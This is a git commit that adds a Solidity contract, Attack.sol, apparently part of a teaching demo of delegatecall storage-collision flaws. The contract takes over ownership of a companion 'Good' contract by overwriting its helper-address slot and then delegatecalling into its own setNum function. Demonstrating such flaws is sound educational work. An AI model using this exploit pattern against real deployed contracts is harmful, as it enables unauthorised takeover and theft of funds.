fea23d5f830268b197ce3b83ab3e2dcdf8f70638
atul <atul.patare@launchventures.co>
2022-12-12 20:15:34 +0530

    added contracts and tests

---
+++ delegatecall/contracts/Attack.sol
@@ -0,0 +1,24 @@
+pragma solidity ^0.8.0;
+
+import "./Good.sol";
+
+contract Attack {
+    address public helper;
+    address public owner;
+    uint public num;
+
+    Good public good;
+
+    constructor(Good _good) {
+        good = _good;
+    }
+
+    function setNum(uint _num) public {
+        owner = msg.sender;
+    }
+
+    function attack() public {
+        good.setNum(uint(uint160(address(this))));
+        good.setNum(1);
+    }
+}
